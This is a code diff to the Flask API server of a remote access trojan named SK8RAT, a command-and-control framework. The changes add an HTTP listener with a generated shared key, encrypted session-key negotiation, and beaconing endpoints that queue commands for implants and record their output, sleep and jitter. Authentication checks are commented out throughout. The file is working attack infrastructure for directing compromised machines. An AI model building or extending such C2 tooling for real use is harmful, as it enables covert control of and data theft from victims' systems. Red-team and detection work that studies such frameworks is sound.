@@ -121,20 +121,29 @@ class AdminUsers(Resource):
             return {'message': 'Something went wrong'}, 500
 
 
-#  /api/listeners/<listener type>
+#  /api/listeners/http
 class CreateListener(Resource):
     #  @jwt_required
     def post(self):
         if not request.is_json:
             return {'message': 'Invalid JSON object'}
+
+        # Make sure only 1 listener exists
+        Listener = ListenerModel.query.filter(ListenerModel.listener_type == "http").first()
+        if Listener:
+            return {'message': 'Http listener already exists.'}
+
         content = request.get_json()
+        # Generate shared key
+        sharedkey = nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
+        sharedkey_b64 = base64.b64encode(sharedkey).decode("UTF-8")
         new_listener = ListenerModel(
             name=content['name'],
-            description=content['description'],
+            description="SK8RATs http listener",
             ip=content['ip'],
             port=content['port'],
-            listener_type=content['listener_type'],
-            staging_key=content['staging_key']
+            listener_type="http",
+            shared_key=sharedkey_b64
         )
         new_listener.save_to_db()
         return {'message': 'Listener created'}
@@ -190,18 +199,20 @@ class SingleSK8RAT(Resource):
     def delete(self, SK8RAT_name):
         return SK8RATModel.delete_single(SK8RAT_name)
 
-
-#  /api/SK8RATs/<name>/rename
-class RenameSK8RAT(Resource):
-    #  jwt_required
+    #  @jwt_required
     def post(self, SK8RAT_name):
         # Get raw request and read as json blob
         request_raw = request.data.decode("UTF-8")
         json_blob = json.loads(request_raw)
        
-        # Update db
+        # Update name, sleep and jitter
         SK8RAT = SK8RATModel.query.filter(SK8RATModel.name == SK8RAT_name).first()
-        SK8RAT.name = json_blob['name']
+        if (json_blob['name'] != ""):
+            SK8RAT.name = json_blob['name']
+        if (json_blob['sleep'] != ""):
+            SK8RAT.sleep = json_blob['sleep']
+        if (json_blob['jitter'] != ""):
+            SK8RAT.jitter = json_blob['jitter']
         SK8RAT.save_to_db()
 
         return {'message': 'Success'}
@@ -217,7 +228,7 @@ class TaskSK8RAT(Resource):
 
         # Check SK8RAT by name
         SK8RAT = SK8RATModel.query.filter(SK8RATModel.name == SK8RAT_name).first()
-        
+
         # If name doesn't exist, error; else grab guid
         if (not SK8RAT):
             return {'message': 'SK8RAT does not exist.'}
@@ -278,13 +289,16 @@ class NegotiateSessionKey(Resource):
     def post(self):
         # Get raw request
         request_raw = request.data.decode("UTF-8")    
-     
+  
         # Split by ":"
         post_data = request_raw.split(":")
         guid = post_data[0]
-        sharedkey = base64.b64decode(post_data[1])
-        nonce = base64.b64decode(post_data[2])
-        ciphertext = base64.b64decode(post_data[3])
+        nonce = base64.b64decode(post_data[1])
+        ciphertext = base64.b64decode(post_data[2])
+
+        # Grab shared key from listener
+        Listener = ListenerModel.query.filter(ListenerModel.listener_type == "http").first()
+        sharedkey = base64.b64decode(Listener.shared_key)
 
         # Decode ciphertext using pynacl
         box = nacl.secret.SecretBox(sharedkey)
@@ -441,44 +455,37 @@ class Beaconing(Resource):
         else:
             return {'message': 'Bad cookie.'}
 
-        # Begin to assemble server response
+        task = TaskModel.query.filter(TaskModel.guid == SK8RAT.guid).filter(TaskModel.task_status == "wait").all()        
+
+        # Assemble task_id, task, task_status, task_output
+        task_id_list = []
+        task_list = []
+        task_status_list = []
+        task_output_list = []
+        for x in task:
+            task_id_list.append(x.task_id)
+            task_list.append(x.task)
+            task_status_list.append(x.task_status)
+            task_output_list.append(x.task_output)
+
+        # Assemble complete message
         # <SK8RAT_Message Structure>
         # guid
-        # task_id
-        # task_status
-        # task_output
         # last_seen
         # sleep
         # jitter
+        # task_id
+        # task
+        # task_status
+        # task_output
         data = {}
         data['guid'] = SK8RAT.guid
-        data['last_seen'] = None
-        data['sleep'] = None
-
-        # Assemble task_id .filter(TaskModel.guid == SK8RAT.guid) #SWITCH THIS AFTER TESTING
-        #task = TaskModel.query.filter(TaskModel.task_status == "wait").all()
-        task = TaskModel.query.filter(TaskModel.task_status == "wait").all()
-        task_id_list = []
-        for x in task:
-            task_id_list.append(x.task_id)
+        data['last_seen'] = SK8RAT.last_seen
+        data['sleep'] = SK8RAT.sleep
+        data['jitter'] = SK8RAT.jitter
         data['task_id'] = task_id_list
-
-        # Assemble task
-        task_list = []
-        for x in task:
-            task_list.append(x.task)
         data['task'] = task_list
-
-        # Assemble task_status
-        task_status_list = []
-        for x in task:
-            task_status_list.append(x.task_status)
         data['task_status'] = task_status_list
-
-        # Assemble task_output
-        task_output_list = []
-        for x in task:
-            task_output_list.append(x.task_output)
         data['task_output'] = task_output_list
 
         # Server response assembled
@@ -496,10 +503,51 @@ class Beaconing(Resource):
 
         return server_response
 
-
     def post(self):
-        return "here we handle POST"
+        # Get raw request
+        request_raw = request.data.decode("UTF-8")
 
+        # Split by ":"
+        post_data = request_raw.split(":")
+        nonce = base64.b64decode(post_data[0])
+        ciphertext = base64.b64decode(post_data[1])
+
+        # Read session cookie and grab corresponding session key, if cookie is invalid throw error
+        session_cookie = request.cookies.get('macaroon')
+        SK8RAT = SK8RATModel.query.filter(SK8RATModel.session_cookie == session_cookie).first()
+        if (SK8RAT):
+            session_key = base64.b64decode(SK8RAT.session_key)
+        else:
+            return {'message': 'Bad cookie.'}
+        
+        # Decode ciphertext using pynacl, store as json object
+        box = nacl.secret.SecretBox(session_key)
+        json_string = box.decrypt(ciphertext, nonce)
+        json_blob = json.loads(json_string)
+
+        # <SK8RAT_Message Structure>
+        # guid
+        # last_seen
+        # sleep
+        # jitter
+        # task_id
+        # task
+        # task_status
+        # task_output
+
+        # Update last_seen in database
+        SK8RAT.last_seen = json_blob['last_seen']
+        SK8RAT.save_to_db()
+
+        # Loop through and match task_id and guid to retrieve correct TaskModel
+        counter = 0
+        for x in json_blob['task_id']:
+            Task = TaskModel.query.filter(TaskModel.guid == SK8RAT.guid).filter(TaskModel.task_id == x).first()
+            Task.task_status = json_blob['task_status'][counter]
+            Task.task_output = json_blob['task_output'][counter]
+            Task.save_to_db()
+            counter = counter + 1
+            
 
 # /sessiontest1
 class sessiontest1(Resource):
